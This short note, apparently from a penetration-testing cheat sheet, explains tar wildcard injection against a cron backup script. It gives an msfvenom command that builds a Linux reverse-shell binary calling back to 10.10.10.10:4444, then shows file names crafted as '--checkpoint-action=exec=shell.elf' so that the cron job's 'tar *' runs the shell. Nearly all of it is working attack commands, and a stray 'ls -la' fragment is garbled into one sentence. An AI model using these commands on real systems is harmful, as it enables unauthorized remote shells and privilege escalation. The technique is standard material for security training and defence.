When tar is run in a script that is run for example by a cron job and it has a `*`:

Example script:
```sh
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

If we put a reverse shell command in a file, for example:
`msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.10 LPORT=4444 -f elf -o shell.elf`
or a script or whatever.ls -la
put it in the directory and set is as executable:
`chmod +x ./shell.elf`

And also make files to emulate the options to tar to run a file like this:
`touch ./--checkpoint=1`
`touch ./--checkpoint-action=exec=shell.elf`

When the script is run it will run our executable!
